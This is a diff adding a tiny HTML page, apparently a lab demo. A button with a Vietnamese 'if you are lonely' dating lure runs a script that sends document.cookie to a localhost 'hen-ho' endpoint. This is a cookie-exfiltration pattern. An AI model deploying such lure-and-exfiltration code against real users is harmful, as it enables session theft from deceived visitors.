@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<button onclick="send()">Nếu bạn cô đơn thì hay trang web này</button>
+
+<script>
+    function send(){
+        window.open('http://localhost:8081/hen-ho?cookie='+document.cookie);
+    }
+</script>
+</body>
+</html>
